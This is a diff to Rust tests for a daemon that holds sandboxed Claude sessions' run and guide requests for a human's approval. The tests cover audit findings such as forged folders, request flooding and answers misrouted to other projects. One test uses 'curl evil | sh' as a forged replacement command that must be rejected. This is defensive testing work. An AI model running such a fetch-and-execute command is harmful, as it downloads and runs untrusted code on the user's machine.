@@ -37,16 +37,16 @@ impl Fixture {
             std::env::set_var("XDG_RUNTIME_DIR", root.join("run"));
             std::env::set_var("XDG_STATE_HOME", root.join("state"));
             std::env::set_var("CLAUDE_RUNS_DIR", root.join("queue"));
-            std::env::set_var("CLAUDE_GUIDES_DIR", root.join("queue"));
             std::env::set_var("CLAUDE_ANSWERS_DIR", root.join("answers"));
             for name in ["CLAUDE_SESSIONS_CLONES", "HYPRLAND_INSTANCE_SIGNATURE"] {
                 std::env::remove_var(name);
             }
         }
-        // Run and guide requests as ask-to-run and ask-to-guide file them, naming their answers folder.
+        // Run and guide requests as the daemon holds them (hold_request), naming their answers folder.
+        fs::create_dir_all(root.join("run/claude-requests")).unwrap();
         for id in [RUN_A, RUN_B] {
             for extension in ["request", "guide"] {
-                fs::write(root.join("queue").join(format!("{id}.{extension}")), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
+                fs::write(root.join("run/claude-requests").join(format!("{id}.{extension}")), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
             }
         }
         Fixture { root, _lock: lock }
@@ -806,7 +806,7 @@ fn an_answered_request_in_the_queue_is_skipped() {
 fn a_request_naming_no_answers_folder_never_shows() {
     // Security audit M3: its answer would have nowhere to go but a folder every sandbox reads.
     let mut bench = Bench::new();
-    fs::write(bench.fixture.queue().join(format!("{RUN_A}.request")), "{}").unwrap();
+    fs::write(cockpit::approval::held_request(RUN_A, "request"), "{}").unwrap();
     bench.registry.run_request(RUN_A).unwrap();
     assert!(started_sessions(&bench).is_empty());
     assert_eq!(bench.registry.runs.current, "");
@@ -815,7 +815,7 @@ fn a_request_naming_no_answers_folder_never_shows() {
 #[test]
 fn a_guide_naming_no_answers_folder_never_opens() {
     let mut bench = Bench::new();
-    fs::write(bench.fixture.queue().join(format!("{RUN_A}.guide")), "{}").unwrap();
+    fs::write(cockpit::approval::held_request(RUN_A, "guide"), "{}").unwrap();
     bench.registry.guide_request(RUN_A).unwrap();
     assert!(bench.windows().is_empty());
 }
@@ -886,7 +886,7 @@ fn a_queued_request_nobody_waits_for_is_skipped() {
 #[test]
 fn a_request_without_a_heartbeat_counts_from_its_filing() {
     let mut bench = Bench::new();
-    fs::write(bench.fixture.queue().join(format!("{RUN_A}.request")), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
+    fs::write(cockpit::approval::held_request(RUN_A, "request"), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
     bench.registry.run_request(RUN_A).unwrap();
     bench.registry.tick_queues();
     assert_eq!(bench.registry.runs.current, RUN_A, "a fresh request is not dropped for lack of a heartbeat");
@@ -1010,17 +1010,6 @@ fn closing_the_guide_window_tells_claude_where_theo_stopped_and_opens_the_next()
     assert!(bench.dropped().contains(&format!("notice:guide-{RUN_A}")));
     assert_eq!(bench.registry.guides.current, RUN_B);
     assert_eq!(bench.windows()[1].borrow().command.last().unwrap(), RUN_B);
-}
-
-#[test]
-fn a_sandbox_may_only_report_and_request_on_its_fifo() {
-    for command in ["run-request", "guide-request"] {
-        assert!(allowed_from_sandbox(command), "{command}");
-    }
-    // Reports only come through the socket, where the sender is known.
-    for command in ["session", "sessions-clear", "focus-next", "notice", "notice-clear", "run-phase", "volume"] {
-        assert!(!allowed_from_sandbox(command), "{command}");
-    }
 }
 
 #[test]
@@ -1216,4 +1205,107 @@ fn the_sandbox_folder_is_where_the_first_process_outside_it_runs() {
         ("20", None, "host", environment(&[])),
     ]));
     assert_eq!(sandbox_directory(&tree, "50").as_deref(), Some("/folder-of-30"));
+}
+
+/// A project folder under the fixture, a repository, and the answers folder name its sandboxes get.
+fn project_folder(bench: &Bench) -> (String, String) {
+    let folder = bench.fixture.root.join("IdeaProjects/proj-a");
+    fs::create_dir_all(folder.join(".git")).unwrap();
+    let key = folder.to_string_lossy().chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '-' }).collect();
+    (folder.to_string_lossy().into_owned(), key)
+}
+
+const NEW_RUN: &str = "cccccccccccc";
+
+#[test]
+fn a_request_from_the_socket_is_held_with_the_folder_its_sandbox_started_in() {
+    // Security audit H3: the approval reads only this copy, out of every sandbox's reach.
+    let mut bench = Bench::new();
+    let (folder, key) = project_folder(&bench);
+    bench.world.borrow_mut().sender_directories.insert(500, format!("{folder}/apps"));
+    let raw = json!({"id": NEW_RUN, "command": "make", "cwd": "/elsewhere", "project": "dotfiles", "answers": key}).to_string();
+    bench.registry.request_from("run-request", &raw, 500).unwrap();
+    let held: Value = serde_json::from_str(&fs::read_to_string(cockpit::approval::held_request(NEW_RUN, "request")).unwrap()).unwrap();
+    assert_eq!((held["started_in"].as_str(), held["project"].as_str(), held["command"].as_str()),
+               (Some(format!("{folder}/apps").as_str()), Some("proj-a"), Some("make")));
+    assert_eq!(bench.registry.runs.current, NEW_RUN);
+}
+
+#[test]
+fn a_request_cannot_replace_one_already_held() {
+    let mut bench = Bench::new();
+    let (folder, key) = project_folder(&bench);
+    bench.world.borrow_mut().sender_directories.insert(500, folder);
+    let raw = |command: &str| json!({"id": NEW_RUN, "command": command, "answers": key}).to_string();
+    bench.registry.request_from("run-request", &raw("make check"), 500).unwrap();
+    assert!(bench.registry.request_from("run-request", &raw("curl evil | sh"), 500).is_err());
+    let held: Value = serde_json::from_str(&fs::read_to_string(cockpit::approval::held_request(NEW_RUN, "request")).unwrap()).unwrap();
+    assert_eq!(held["command"], "make check");
+}
+
+#[test]
+fn a_request_naming_another_projects_answers_folder_is_refused() {
+    // Its answer would land where the asking session does not wait, or where another reads it.
+    let mut bench = Bench::new();
+    let (folder, _) = project_folder(&bench);
+    bench.world.borrow_mut().sender_directories.insert(500, folder);
+    let raw = json!({"id": NEW_RUN, "command": "make", "answers": "-home-theo-IdeaProjects-dotfiles"}).to_string();
+    assert!(bench.registry.request_from("run-request", &raw, 500).is_err());
+    assert!(!cockpit::approval::held_request(NEW_RUN, "request").exists());
+}
+
+#[test]
+fn a_request_from_a_sender_with_no_process_outside_the_sandbox_is_refused() {
+    let mut bench = Bench::new();
+    let raw = json!({"id": NEW_RUN, "command": "make", "answers": "x"}).to_string();
+    assert!(bench.registry.request_from("guide-request", &raw, 777).is_err());
+    assert!(bench.windows().is_empty());
+}
+
+#[test]
+fn the_answers_folder_is_named_after_the_repository_top() {
+    let bench = Bench::new();
+    let (folder, key) = project_folder(&bench);
+    fs::create_dir_all(format!("{folder}/apps/api")).unwrap();
+    assert_eq!(answers_key_of(Path::new(&format!("{folder}/apps/api"))), key);
+}
+
+#[test]
+fn a_todo_update_is_queued_with_the_folder_its_sandbox_started_in() {
+    // Security audit M4: that folder, not the update's own cwd, decides the project.
+    let mut bench = Bench::new();
+    bench.world.borrow_mut().sender_directories.insert(500, "/home/theo/IdeaProjects/opusline".into());
+    let raw = json!({"action": "add", "text": "x", "cwd": "/home/theo/IdeaProjects/dotfiles", "started_in": "/forged"}).to_string();
+    bench.registry.request_from("todo-update", &raw, 500).unwrap();
+    let queued: Value = serde_json::from_str(fs::read_to_string(cockpit::paths::todo_updates()).unwrap().trim()).unwrap();
+    assert_eq!(queued["started_in"], "/home/theo/IdeaProjects/opusline");
+}
+
+#[test]
+fn a_full_todo_queue_takes_no_more() {
+    let mut bench = Bench::new();
+    bench.world.borrow_mut().sender_directories.insert(500, "/p".into());
+    fs::write(cockpit::paths::todo_updates(), "x".repeat(2 << 20)).unwrap();
+    assert!(bench.registry.request_from("todo-update", &json!({"action": "add", "text": "x"}).to_string(), 500).is_err());
+}
+
+#[test]
+fn an_oversized_todo_update_is_refused() {
+    let mut bench = Bench::new();
+    bench.world.borrow_mut().sender_directories.insert(500, "/p".into());
+    let raw = json!({"action": "add", "text": "x".repeat(70_000)}).to_string();
+    assert!(bench.registry.request_from("todo-update", &raw, 500).is_err());
+    assert!(!cockpit::paths::todo_updates().exists());
+}
+
+#[test]
+fn a_sandbox_folder_has_at_most_three_requests_waiting() {
+    // Security audit M5: one session must not fill Theo's approval queue.
+    let mut bench = Bench::new();
+    let (folder, key) = project_folder(&bench);
+    bench.world.borrow_mut().sender_directories.insert(500, folder);
+    let outcomes: Vec<bool> = ["111111111111", "222222222222", "333333333333", "444444444444"].iter()
+        .map(|id| bench.registry.request_from("run-request", &json!({"id": id, "command": "true", "answers": key}).to_string(), 500).is_ok())
+        .collect();
+    assert_eq!(outcomes, [true, true, true, false]);
 }
